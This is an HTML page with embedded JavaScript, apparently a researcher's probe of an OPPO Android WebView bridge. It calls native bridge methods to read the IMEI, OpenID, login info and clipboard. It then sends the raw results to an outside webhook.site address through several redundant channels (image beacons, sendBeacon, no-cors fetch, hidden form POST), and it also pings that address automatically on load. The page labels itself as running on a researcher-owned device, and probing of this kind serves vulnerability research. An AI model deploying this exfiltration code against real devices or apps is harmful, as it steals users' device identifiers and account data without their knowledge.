<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>OPPO WebBridge Mobile Probe v6</title>
  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=yes">
  <style>
    * { box-sizing: border-box; }
    body {
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
      margin: 0;
      padding: 24px 18px 90px;
      background: #000;
      color: #f5f5f5;
      font-size: 22px;
      line-height: 1.45;
    }
    h1 { margin: 0 0 12px; font-size: 40px; line-height: 1.12; }
    .warn { color: #ff4d73; font-weight: 900; font-size: 24px; margin: 14px 0 22px; }
    .target {
      background: #121212;
      border: 1px solid #444;
      border-radius: 18px;
      padding: 14px;
      margin: 14px 0;
      font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
      font-size: 16px;
      word-break: break-all;
      color: #a6ffcb;
    }
    .btns { display: flex; flex-wrap: wrap; gap: 12px; margin: 18px 0; }
    button {
      border: 0;
      border-radius: 16px;
      padding: 18px 22px;
      font-size: 22px;
      font-weight: 900;
      min-height: 64px;
      background: #eee;
      color: #111;
    }
    button.primary { background: #43d08d; }
    button.danger { background: #ff4d73; color: #000; }
    button.wide { width: 100%; }
    .status {
      margin: 18px 0;
      padding: 16px;
      border: 1px solid #333;
      border-radius: 18px;
      background: #111;
      font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
      font-size: 20px;
      white-space: pre-wrap;
      word-break: break-word;
    }
    .card {
      margin: 14px 0;
      padding: 16px;
      border-radius: 18px;
      background: #151515;
      border: 1px solid #333;
    }
    .card h2 { margin: 0 0 10px; font-size: 26px; }
    .ok { color: #5cff9f; font-weight: 900; }
    .bad { color: #ff667f; font-weight: 900; }
    .muted { color: #aaa; }
    .kv {
      font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
      font-size: 18px;
      white-space: pre-wrap;
      word-break: break-word;
    }
    pre {
      display: none;
      background: #f3f3f3;
      color: #111;
      padding: 16px;
      white-space: pre-wrap;
      word-break: break-word;
      font-size: 16px;
      border-radius: 12px;
    }
    iframe { width: 1px; height: 1px; border: 0; opacity: 0; position: absolute; left: -9999px; }
  </style>
</head>
<body>
<h1>OPPO WebBridge Mobile Probe v6</h1>
<p class="warn">v6 adds a top-level navigation ping and HTML form POST fallback. Use it to prove whether webhook.site is reachable from this WebView.</p>

<div class="target" id="target"></div>

<div class="btns">
  <button class="primary" onclick="pingWebhook('manual_ping_button')">Ping webhook</button>
  <button class="danger" onclick="navigateWebhookPing()">NAVIGATE webhook ping</button>
  <button class="primary wide" onclick="tryDispatcherReadonly()">Dispatcher readonly APIs</button>
  <button onclick="runRawProbe()">RAW sensitive probe</button>
  <button onclick="tryIndirectNativeApi()">Indirect native API</button>
  <button onclick="tryClipboardMarker()">Clipboard marker</button>
  <button onclick="tryStartLogin()">doStartLogin</button>
  <button onclick="toggleJson()">Toggle full JSON</button>
</div>

<div id="status" class="status">WAITING</div>
<div id="cards"></div>
<pre id="out"></pre>

<iframe name="webhook_sink" id="webhook_sink"></iframe>

<script>
(function () {
  const WEBHOOK = "https://webhook.site/9b2aafd6-f924-4f83-a4c9-273028a6e160";
  const VERSION = "mobile_probe_v6_form_nav";
  window.__OPPO_WEBHOOK = WEBHOOK;
  window.__OPPO_VERSION = VERSION;
  window.__LAST_PAYLOAD = null;

  document.getElementById("target").textContent = "WEBHOOK=" + WEBHOOK + "\nVERSION=" + VERSION;

  const READONLY_ACTIONS = [
    "account_islogin",
    "account_get_userid",
    "account_get_userinfo",
    "get_open_id",
    "get_imei",
    "get_channel_id",
    "get_package_name",
    "get_device_model",
    "get_network_type"
  ];

  const RAW_METHODS = [
    "getImei",
    "getOpenId",
    "getLoginInfo",
    "isLogin",
    "getChannelId",
    "getPackageName",
    "getDeviceModel",
    "getNetworkType",
    "getRomVersion",
    "getRomVersionCode",
    "getStatusBarHeight",
    "isInstalled",
    "isSupportShake",
    "getProgress",
    "getButtonStatus"
  ];

  function safeString(x) {
    try {
      if (x === undefined) return "undefined";
      if (x === null) return "null";
      if (typeof x === "string") return x;
      if (typeof x === "number" || typeof x === "boolean") return String(x);
      return JSON.stringify(x);
    } catch (e) {
      try { return String(x); } catch (_) { return "[unstringifiable]"; }
    }
  }

  function short(s, n) {
    s = safeString(s);
    if (s.length <= n) return s;
    return s.slice(0, n) + "...[+" + (s.length - n) + " chars]";
  }

  function describeAndroidObject() {
    const a = window.android;
    if (!a || typeof a !== "object") return { exists: false, type: typeof a };
    let ownKeys = [];
    let functionKeys = [];
    try {
      ownKeys = Object.getOwnPropertyNames(a).slice(0, 180);
      functionKeys = ownKeys.filter(k => {
        try { return typeof a[k] === "function"; } catch (e) { return false; }
      });
    } catch (e) {}
    return {
      exists: true,
      type: typeof a,
      tag: Object.prototype.toString.call(a),
      ownKeys,
      functionKeys
    };
  }

  function callBridge(method, args) {
    const a = window.android;
    const item = {
      method,
      args: args || [],
      exists: false,
      ok: false,
      returnType: null,
      rawReturnValue: null,
      empty: null,
      error: null
    };
    try {
      if (!a || typeof a !== "object") {
        item.error = "window.android missing";
        return item;
      }
      item.exists = typeof a[method] === "function";
      if (!item.exists) {
        item.error = "missing_or_not_function";
        return item;
      }
      const ret = a[method].apply(a, args || []);
      const raw = safeString(ret);
      item.ok = true;
      item.returnType = typeof ret;
      item.rawReturnValue = raw;
      item.empty = raw.length === 0 || raw === "undefined" || raw === "null";
      return item;
    } catch (e) {
      item.error = String(e && (e.stack || e.message || e));
      return item;
    }
  }

  function callBridgeOneArg(method, arg) {
    const item = {
      bridgeMethod: method,
      arg,
      exists: false,
      ok: false,
      returnType: null,
      rawReturnValue: null,
      empty: null,
      error: null
    };
    try {
      const a = window.android;
      if (!a || typeof a !== "object") {
        item.error = "window.android missing";
        return item;
      }
      item.exists = typeof a[method] === "function";
      if (!item.exists) {
        item.error = "missing_or_not_function";
        return item;
      }
      const ret = a[method](arg);
      const raw = safeString(ret);
      item.ok = true;
      item.returnType = typeof ret;
      item.rawReturnValue = raw;
      item.empty = raw === "" || raw === "undefined" || raw === "null";
      return item;
    } catch (e) {
      item.error = String(e && (e.stack || e.message || e));
      return item;
    }
  }

  function basePayload(eventType, reason) {
    return {
      eventType,
      version: VERSION,
      ts: new Date().toISOString(),
      reason,
      safetyBoundary: {
        rawSensitiveValuesDisplayedOnDevice: true,
        rawSensitiveValuesSentToWebhook: true,
        testingDevice: "researcher_owned_device"
      },
      location: {
        href: location.href,
        origin: location.origin,
        protocol: location.protocol,
        referrer: document.referrer || null
      },
      environment: {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        cookieEnabled: navigator.cookieEnabled,
        webdriver: navigator.webdriver
      },
      androidBridge: describeAndroidObject()
    };
  }

  function queryFromPayload(payload, maxLen) {
    const json = JSON.stringify(payload);
    return "event=" + encodeURIComponent(payload.eventType) +
      "&version=" + encodeURIComponent(VERSION) +
      "&t=" + encodeURIComponent(Date.now()) +
      "&bridge=" + encodeURIComponent(!!window.android) +
      "&ua=" + encodeURIComponent(navigator.userAgent.slice(0, 160)) +
      "&d=" + encodeURIComponent(json.slice(0, maxLen || 2200));
  }

  function sendFormPost(path, payload) {
    try {
      const form = document.createElement("form");
      form.method = "POST";
      form.action = WEBHOOK + path + "?event=" + encodeURIComponent(payload.eventType) + "&t=" + Date.now();
      form.target = "webhook_sink";
      form.enctype = "text/plain";

      const input = document.createElement("textarea");
      input.name = "payload";
      input.value = JSON.stringify(payload);
      form.appendChild(input);

      document.body.appendChild(form);
      form.submit();
      setTimeout(function(){ try { form.remove(); } catch(e){} }, 2000);
    } catch (e) {}
  }

  function sendWebhook(payload) {
    const json = JSON.stringify(payload);
    const eventPath = "/v6-" + String(payload.eventType || "event").toLowerCase().replace(/[^a-z0-9]+/g, "-").replace(/^-|-$/g, "");

    // 1. Extremely short GET ping.
    try {
      new Image().src = WEBHOOK + "/v6-ping?event=" + encodeURIComponent(payload.eventType) + "&t=" + Date.now() + "&bridge=" + encodeURIComponent(!!window.android);
    } catch (e) {}

    // 2. Short summary GET.
    try {
      new Image().src = WEBHOOK + "/v6-summary?" + queryFromPayload(payload, 1500);
    } catch (e) {}

    // 3. Chunked GET.
    try {
      const enc = encodeURIComponent(json);
      const size = 1500;
      const total = Math.ceil(enc.length / size);
      for (let i = 0; i < Math.min(total, 12); i++) {
        const part = enc.slice(i * size, (i + 1) * size);
        const img = new Image();
        img.src = WEBHOOK + "/v6-chunk?event=" + encodeURIComponent(payload.eventType) + "&idx=" + i + "&total=" + total + "&t=" + Date.now() + "&d=" + part;
      }
    } catch (e) {}

    // 4. Beacon with text/plain.
    try {
      navigator.sendBeacon(
        WEBHOOK + eventPath + "-beacon",
        new Blob([json], { type: "text/plain" })
      );
    } catch (e) {}

    // 5. Fetch no-cors text/plain.
    try {
      fetch(WEBHOOK + eventPath + "-fetch", {
        method: "POST",
        mode: "no-cors",
        headers: { "content-type": "text/plain" },
        body: json
      }).catch(function(){});
    } catch (e) {}

    // 6. Classic HTML form POST to hidden iframe.
    sendFormPost(eventPath + "-form", payload);
  }

  function renderCards(payload) {
    const root = document.getElementById("cards");
    root.innerHTML = "";

    const top = document.createElement("div");
    top.className = "card";
    top.innerHTML =
      "<h2>" + payload.eventType + "</h2>" +
      "<div class='kv'>time=" + payload.ts + "\nbridge=" + (!!window.android) + "\nwebhook target=" + WEBHOOK + "\nWebhook pings/chunks/form attempted.</div>";
    root.appendChild(top);

    const items = payload.results || [];
    const hot = items.filter(x => {
      const s = safeString(x.rawReturnValue);
      return x.ok && !(x.empty) && s !== "" && s !== "undefined" && s !== "null";
    });

    const hotCard = document.createElement("div");
    hotCard.className = "card";
    if (hot.length) {
      hotCard.innerHTML = "<h2 class='ok'>OK_NON_EMPTY count=" + hot.length + "</h2>";
      hot.forEach(x => {
        const div = document.createElement("div");
        div.className = "kv";
        div.style.marginTop = "12px";
        div.textContent =
          "method=" + (x.method || x.bridgeMethod) + "\n" +
          "arg=" + short(x.arg || x.args || "", 500) + "\n" +
          "returnType=" + x.returnType + "\n" +
          "rawReturnValue=" + short(x.rawReturnValue, 1200);
        hotCard.appendChild(div);
      });
    } else {
      hotCard.innerHTML = "<h2 class='bad'>NO_NON_EMPTY_SENSITIVE_RETURN_YET</h2><div class='kv'>All tested sensitive/account actions are empty, undefined, null, missing, or failed so far.</div>";
    }
    root.appendChild(hotCard);

    items.slice(0, 80).forEach(x => {
      const card = document.createElement("div");
      card.className = "card";
      const okClass = x.ok ? (x.empty ? "muted" : "ok") : "bad";
      card.innerHTML =
        "<h2 class='" + okClass + "'>" + (x.method || x.bridgeMethod) + "</h2>" +
        "<div class='kv'>" +
        "ok=" + x.ok + "\n" +
        "exists=" + x.exists + "\n" +
        "empty=" + x.empty + "\n" +
        "returnType=" + x.returnType + "\n" +
        "arg=" + short(x.arg || x.args || "", 500) + "\n" +
        "rawReturnValue=" + short(x.rawReturnValue, 1000) + "\n" +
        "error=" + short(x.error, 800) +
        "</div>";
      root.appendChild(card);
    });
  }

  function renderAndSend(payload) {
    window.__LAST_PAYLOAD = payload;
    document.getElementById("status").textContent =
      payload.eventType + "\n" +
      payload.ts + "\n" +
      "bridge=" + (!!window.android) + "\n" +
      "Webhook target=" + WEBHOOK + "\n" +
      "Webhook pings/chunks/form attempted.";
    document.getElementById("out").textContent = JSON.stringify(payload, null, 2);
    renderCards(payload);
    sendWebhook(payload);
  }

  window.toggleJson = function() {
    const p = document.getElementById("out");
    p.style.display = p.style.display === "block" ? "none" : "block";
  };

  window.pingWebhook = function(reason) {
    const payload = basePayload("OPPO_V6_WEBHOOK_PING", reason || "manual_ping");
    payload.note = "If this does not appear in webhook.site, the issue is endpoint/network/WebView outbound delivery, not bridge logic.";
    renderAndSend(payload);
  };

  window.navigateWebhookPing = function() {
    const url = WEBHOOK +
      "/v6-nav-ping?event=OPPO_V6_NAV_PING&t=" + Date.now() +
      "&bridge=" + encodeURIComponent(!!window.android) +
      "&ua=" + encodeURIComponent(navigator.userAgent.slice(0, 180)) +
      "&from=" + encodeURIComponent(location.href.slice(0, 220));
    location.href = url;
  };

  window.runRawProbe = function() {
    const payload = basePayload("OPPO_V6_RAW_RESULT", "manual_raw_probe");
    payload.results = RAW_METHODS.map(m => callBridge(m, []));
    renderAndSend(payload);
  };

  window.tryDispatcherReadonly = function () {
    const candidates = [];
    for (const a of READONLY_ACTIONS) {
      candidates.push({ type: a });
      candidates.push({ action: a });
      candidates.push({ method: a });
      candidates.push({ name: a });
      candidates.push({ id: a });
      candidates.push({ type: a, data: {} });
      candidates.push({ id: "oppo_audit_" + a, type: a, data: {} });
      candidates.push({ id: "oppo_audit_" + a, type: a, params: {} });
      candidates.push({ action: a, data: {} });
      candidates.push({ action: a, params: {} });
      candidates.push({ method: a, data: {} });
      candidates.push({ method: a, params: {} });
    }
    const results = [];
    for (const c of candidates) {
      const arg = JSON.stringify(c);
      results.push(callBridgeOneArg("callNativeApi", arg));
      results.push(callBridgeOneArg("callAsyncNativeApi", arg));
    }
    const payload = basePayload("OPPO_V6_DISPATCHER_READONLY_RESULT", "manual_dispatcher_readonly");
    payload.actions = READONLY_ACTIONS;
    payload.results = results;
    renderAndSend(payload);
  };

  window.tryIndirectNativeApi = function() {
    const candidates = [
      ["callNativeApi", ["getImei"]],
      ["callNativeApi", ["getOpenId"]],
      ["callNativeApi", ["getLoginInfo"]],
      ["callNativeApi", [JSON.stringify({ method: "getImei" })]],
      ["callNativeApi", [JSON.stringify({ method: "getOpenId" })]],
      ["callNativeApi", [JSON.stringify({ method: "getLoginInfo" })]],
      ["callNativeApi", [JSON.stringify({ api: "getImei" })]],
      ["callNativeApi", [JSON.stringify({ api: "getOpenId" })]],
      ["callNativeApi", [JSON.stringify({ api: "getLoginInfo" })]],
      ["callAsyncNativeApi", ["getImei"]],
      ["callAsyncNativeApi", ["getOpenId"]],
      ["callAsyncNativeApi", ["getLoginInfo"]],
      ["callAsyncNativeApi", [JSON.stringify({ method: "getImei" })]],
      ["callAsyncNativeApi", [JSON.stringify({ method: "getOpenId" })]],
      ["callAsyncNativeApi", [JSON.stringify({ method: "getLoginInfo" })]]
    ];
    const payload = basePayload("OPPO_V6_INDIRECT_NATIVE_API_RESULT", "manual_indirect_native_api");
    payload.results = candidates.map(c => callBridge(c[0], c[1]));
    renderAndSend(payload);
  };

  window.tryClipboardMarker = function() {
    const marker = "OPPO_AUDIT_CLIPBOARD_MARKER_" + Date.now();
    const payload = basePayload("OPPO_V6_CLIPBOARD_MARKER_RESULT", "manual_clipboard_marker");
    payload.marker = marker;
    payload.results = [
      callBridge("clipboardText", []),
      callBridge("clipboardText", [marker]),
      callBridge("clipboardText", [JSON.stringify({ text: marker })])
    ];
    renderAndSend(payload);
  };

  window.tryStartLogin = function() {
    const payload = basePayload("OPPO_V6_START_LOGIN_RESULT", "manual_start_login");
    payload.results = [callBridge("doStartLogin", [])];
    payload.note = "State-changing UI test. Use only if you intentionally want to test login UI opening.";
    renderAndSend(payload);
  };

  setTimeout(function () {
    pingWebhook("auto_after_load_1200ms");
  }, 1200);
})();
</script>
</body>
</html>
